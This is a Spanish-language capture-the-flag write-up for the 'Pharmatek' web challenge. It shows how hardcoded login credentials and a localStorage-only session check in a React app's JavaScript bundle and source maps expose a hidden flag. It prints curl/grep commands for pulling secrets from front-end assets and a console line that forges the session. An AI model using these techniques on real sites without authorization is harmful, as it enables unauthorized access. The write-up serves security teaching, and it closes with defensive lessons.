# Desafío 47 — Pharmatek (secretos en el frontend)

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / secretos en el cliente (SPA + source maps) |
| Dificultad | media |
| Puntos | 525 (6 soluciones) |
| Objetivo | `http://<host>:27370` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> Pharmatek — «Ingresa y reclama tu bandera». Instancia de contenedor: `<host>:27370`.

## Reconocimiento

- `Server: nginx/1.31.8`, HTML estático de una SPA (Vite + React + React Router).
- Bundle principal: `/assets/index-DxM6ovw5.js` (≈387 KB). Rutas del router:
  `/portal/login`, `/portal/dashboard`, además de las páginas públicas.
- El bundle referencia chunks por página (`page-*.js`). Los dos del portal son:
  - `page-Crn_T1qp.js` → login
  - `page-C5Ytzon-.js` → dashboard
- **Los chunks publican source maps** (`//# sourceMappingURL=…js.map`), con el código fuente
  original en `sourcesContent`.

## Análisis

### 1. Login sin backend

El componente de login compara las credenciales contra un objeto **hardcodeado**:

```js
const o = { username: "medico", password: "neurotech2024" };
...
s.username === o.username && s.password === o.password
  ? (localStorage.setItem("isAuthenticated", "true"),
     localStorage.setItem("userRole", "medico"),
     navigate("/portal/dashboard"))
  : setError("Credenciales incorrectas. Intente nuevamente.");
```

No hay petición al servidor: la «autenticación» es una comparación en JavaScript. La página incluso
muestra «Credenciales de Prueba: Usuario: medico» (la clave queda en el bundle).

### 2. Sesión falsificable

El dashboard solo comprueba `localStorage.getItem("isAuthenticated")`:

```js
if (!localStorage.getItem("isAuthenticated")) { navigate("/portal/login"); return; }
```

Basta `localStorage.setItem("isAuthenticated","true")` en las DevTools (o el login con
`medico/neurotech2024`) para entrar.

### 3. La bandera está en el listado de pacientes

En `page-C5Ytzon-.js`, el arreglo de pacientes incluye un campo oculto `flag` (se pinta con una clase
casi transparente `text-gray-700/30`):

```js
{ id: "NX-005", name: "Elena Ruiz", procedure: "Tratamiento Neural",
  flag: "flag{ejemplo}", status: "Estable", lastCheck: "30 min" }
```

Barrido de todos los assets y source maps: la cadena `cdm{...}` aparece **solo** en
`page-C5Ytzon-.js` (y su `.map`), sin señuelos.

## Solución (pasos reproducibles)

```bash
BASE=http://<host>:27370

# 1) Bundle principal y nombre de los chunks
curl -s $BASE/ | grep -o '/assets/[^"]*\.js'
curl -s $BASE/assets/index-DxM6ovw5.js | grep -o 'page-[A-Za-z0-9_-]*\.js' | sort -u

# 2) Credenciales del login (hardcodeadas)
curl -s $BASE/assets/page-Crn_T1qp.js | grep -o 'username:"[^"]*",password:"[^"]*"'

# 3) Bandera en el dashboard
curl -s $BASE/assets/page-C5Ytzon-.js | grep -o 'cdm{[^}]*}'
```

Automatizado: `python scripts/solve.py` (descarga el bundle, enumera los `page-*.js`, extrae las
credenciales y la bandera, y la guarda en `flag.txt`).

```text
[*] bundle principal: /assets/index-DxM6ovw5.js (386754 B)
[*] chunks: ['page-B5jzIjo1.js', ..., 'page-Crn_T1qp.js', 'page-C5Ytzon-.js', ...]
[*] bandera en page-C5Ytzon-.js
[*] credenciales hardcodeadas: medico / neurotech2024
[+] FLAG: flag{ejemplo}
```

Alternativa manual en el navegador: abrir `/portal/login`, entrar con `medico` / `neurotech2024`
(o escribir en la consola `localStorage.setItem("isAuthenticated","true")` y recargar
`/portal/dashboard`); la bandera aparece en la fila del paciente `NX-005`.

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **El frontend no guarda secretos**: credenciales, roles y flags en el bundle son públicos. Cualquier
  usuario puede leer `app.js` (y peor aún con source maps).
- **Autenticación solo en el cliente = ninguna autenticación.** `localStorage` es editable con dos
  líneas de JavaScript.
- **Los source maps en producción** reconstruyen el código fuente completo: hay que desactivarlos o
  restringirlos.
- Técnica de reconocimiento: enumerar los chunks (`page-*.js`) que referencia el bundle y buscar
  cadenas con forma de flag, credenciales y llamadas a `fetch`/`axios`.
- Evidencia en `evidence/`: HTML inicial, bundle principal, chunk de login (credenciales), chunk del
  dashboard (bandera) y cabecera del source map.
